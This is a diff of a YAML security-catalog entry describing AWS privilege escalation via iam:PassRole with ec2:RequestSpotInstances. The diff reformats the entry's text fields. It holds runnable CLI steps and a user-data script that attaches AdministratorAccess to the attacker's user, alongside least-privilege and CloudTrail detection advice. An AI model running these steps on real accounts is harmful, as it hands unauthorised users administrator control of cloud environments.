@@ -35,19 +35,84 @@ prerequisites:
 exploitationSteps:
   awscli:
   - step: 1
-    command: "# Get the AWS account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\n\n# Find a suitable AMI (Amazon Linux 2023)\nAMI_ID=$(aws ec2 describe-images \\\n    --owners amazon \\\n    --filters \"Name=name,Values=al2023-ami-2023.*-x86_64\" \"Name=state,Values=available\" \\\n    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \\\n    --output text)\n\n# Get default VPC and subnet\nDEFAULT_VPC=$(aws ec2 describe-vpcs --filters \"Name=is-default,Values=true\" --query 'Vpcs[0].VpcId' --output text)\nDEFAULT_SUBNET=$(aws ec2 describe-subnets --filters \"Name=vpc-id,Values=$DEFAULT_VPC\" --query 'Subnets[0].SubnetId' --output text)\n"
+    command: |
+      # Get the AWS account ID
+      ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+
+      # Find a suitable AMI (Amazon Linux 2023)
+      AMI_ID=$(aws ec2 describe-images \
+          --owners amazon \
+          --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
+          --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
+          --output text)
+
+      # Get default VPC and subnet
+      DEFAULT_VPC=$(aws ec2 describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)
+      DEFAULT_SUBNET=$(aws ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)
     description: Gather necessary information including account ID, AMI, VPC, and subnet for launching the Spot Instance
   - step: 2
-    command: "# Create user-data script to attach AdministratorAccess to starting principal\nUSER_DATA=$(cat <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n)\n\n# Base64 encode the user-data\nUSER_DATA_B64=$(echo \"$USER_DATA\" | base64 | tr -d '\\n')\n"
+    command: |
+      # Create user-data script to attach AdministratorAccess to starting principal
+      USER_DATA=$(cat <<'EOF'
+      #!/bin/bash
+      exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
+      echo "Starting privilege escalation script..."
+
+      STARTING_USER_NAME="YOUR_USERNAME_HERE"
+
+      # Wait for IAM role to be available
+      sleep 15
+
+      # Attach AdministratorAccess policy to the starting user
+      aws iam attach-user-policy \
+        --user-name $STARTING_USER_NAME \
+        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+      echo "AdministratorAccess attached to $STARTING_USER_NAME successfully"
+      EOF
+      )
+
+      # Base64 encode the user-data
+      USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
     description: Prepare a user-data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username.
   - step: 3
-    command: "# Create launch specification for the Spot Instance\nLAUNCH_SPEC=$(cat <<EOF\n{\n  \"ImageId\": \"$AMI_ID\",\n  \"InstanceType\": \"t3.micro\",\n  \"IamInstanceProfile\": {\n    \"Name\": \"PRIVILEGED_INSTANCE_PROFILE_NAME\"\n  },\n  \"UserData\": \"$USER_DATA_B64\",\n  \"NetworkInterfaces\": [\n    {\n      \"DeviceIndex\": 0,\n      \"SubnetId\": \"$DEFAULT_SUBNET\",\n      \"AssociatePublicIpAddress\": true\n    }\n  ]\n}\nEOF\n)\n"
+    command: |
+      # Create launch specification for the Spot Instance
+      LAUNCH_SPEC=$(cat <<EOF
+      {
+        "ImageId": "$AMI_ID",
+        "InstanceType": "t3.micro",
+        "IamInstanceProfile": {
+          "Name": "PRIVILEGED_INSTANCE_PROFILE_NAME"
+        },
+        "UserData": "$USER_DATA_B64",
+        "NetworkInterfaces": [
+          {
+            "DeviceIndex": 0,
+            "SubnetId": "$DEFAULT_SUBNET",
+            "AssociatePublicIpAddress": true
+          }
+        ]
+      }
+      EOF
+      )
     description: Create the launch specification JSON for the Spot Instance request. Replace PRIVILEGED_INSTANCE_PROFILE_NAME with the name of the privileged instance profile you want to pass.
   - step: 4
-    command: "# Request the Spot Instance with the privileged instance profile\naws ec2 request-spot-instances \\\n    --spot-price \"0.05\" \\\n    --instance-count 1 \\\n    --type \"one-time\" \\\n    --launch-specification \"$LAUNCH_SPEC\"\n"
+    command: |
+      # Request the Spot Instance with the privileged instance profile
+      aws ec2 request-spot-instances \
+          --spot-price "0.05" \
+          --instance-count 1 \
+          --type "one-time" \
+          --launch-specification "$LAUNCH_SPEC"
     description: Request an EC2 Spot Instance with the privileged instance profile. This uses `iam:PassRole` to assign the privileged role to the Spot Instance.
   - step: 5
-    command: "# Monitor the Spot Instance request status\naws ec2 describe-spot-instance-requests \\\n    --spot-instance-request-ids SPOT_REQUEST_ID \\\n    --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \\\n    --output table\n"
+    command: |
+      # Monitor the Spot Instance request status
+      aws ec2 describe-spot-instance-requests \
+          --spot-instance-request-ids SPOT_REQUEST_ID \
+          --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \
+          --output table
     description: Monitor the Spot Instance request until it is fulfilled. Replace SPOT_REQUEST_ID with the ID from the previous command. Wait until the State is 'active' and Status is 'fulfilled'.
   - step: 6
     command: '# Wait 2-3 minutes for the instance to launch and execute the user-data script
@@ -68,7 +133,34 @@ exploitationSteps:
 limitations: 'This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or provide access to sensitive data.
 
   '
-recommendation: "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does an EC2 Spot Instance need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificEC2Role\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ec2.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Apply the same security controls to `ec2:RequestSpotInstances` as you would to `ec2:RunInstances` - both provide equivalent privilege escalation paths\n- Monitor CloudTrail for unusual EC2 Spot Instance requests followed by immediate access\n- Monitor CloudTrail for Spot Instance launches by principals who do not usually create instances\n- Monitor CloudTrail for roles being passed to EC2 Spot Instances that haven't been used before\n- Monitor and alert on EC2 Spot Instance creation with privileged roles\n- Regularly audit EC2 instances (including Spot Instances) for excessive IAM permissions\n- Regularly audit all IAM roles that trust the EC2 service and down-scope any roles with administrative access\n"
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative service roles** - Very rarely does an EC2 Spot Instance need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificEC2Role",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ec2.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Apply the same security controls to `ec2:RequestSpotInstances` as you would to `ec2:RunInstances` - both provide equivalent privilege escalation paths
+  - Monitor CloudTrail for unusual EC2 Spot Instance requests followed by immediate access
+  - Monitor CloudTrail for Spot Instance launches by principals who do not usually create instances
+  - Monitor CloudTrail for roles being passed to EC2 Spot Instances that haven't been used before
+  - Monitor and alert on EC2 Spot Instance creation with privileged roles
+  - Regularly audit EC2 instances (including Spot Instances) for excessive IAM permissions
+  - Regularly audit all IAM roles that trust the EC2 service and down-scope any roles with administrative access
 discoveryAttribution:
   firstDocumented:
     source: HackTricks
@@ -124,7 +216,18 @@ attackVisualization:
     label: User-data script executes
     type: payload
     color: '#99ccff'
-    description: "The user-data script runs automatically when the Spot Instance boots, executing with the target-role's credentials. The script attempts to attach the AdministratorAccess policy to the starting principal.\n\nExample user-data script:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name starting-principal-name \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe script's success depends on whether the target-role has IAM write permissions.\n"
+    description: |
+      The user-data script runs automatically when the Spot Instance boots, executing with the target-role's credentials. The script attempts to attach the AdministratorAccess policy to the starting principal.
+
+      Example user-data script:
+      ```bash
+      #!/bin/bash
+      aws iam attach-user-policy \
+        --user-name starting-principal-name \
+        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      ```
+
+      The script's success depends on whether the target-role has IAM write permissions.
   - id: admin
     label: Effective Administrator
     type: outcome
@@ -151,7 +254,24 @@ attackVisualization:
   - from: start
     to: spot_instance
     label: iam:PassRole + ec2:RequestSpotInstances
-    description: "The starting principal uses `ec2:RequestSpotInstances` to request an EC2 Spot Instance and `iam:PassRole` to pass a privileged IAM role via an instance profile.\n\nCommand:\n```bash\naws ec2 request-spot-instances \\\n  --spot-price \"0.05\" \\\n  --instance-count 1 \\\n  --type \"one-time\" \\\n  --launch-specification '{\n    \"ImageId\": \"ami-xxxxx\",\n    \"InstanceType\": \"t3.micro\",\n    \"IamInstanceProfile\": {\"Name\": \"privileged-instance-profile\"},\n    \"UserData\": \"base64-encoded-script\"\n  }'\n```\n\nThis creates a Spot Instance request with the privileged role attached.\n"
+    description: |
+      The starting principal uses `ec2:RequestSpotInstances` to request an EC2 Spot Instance and `iam:PassRole` to pass a privileged IAM role via an instance profile.
+
+      Command:
+      ```bash
+      aws ec2 request-spot-instances \
+        --spot-price "0.05" \
+        --instance-count 1 \
+        --type "one-time" \
+        --launch-specification '{
+          "ImageId": "ami-xxxxx",
+          "InstanceType": "t3.micro",
+          "IamInstanceProfile": {"Name": "privileged-instance-profile"},
+          "UserData": "base64-encoded-script"
+        }'
+      ```
+
+      This creates a Spot Instance request with the privileged role attached.
   - from: spot_instance
     to: target_role
     label: Instance assumes role
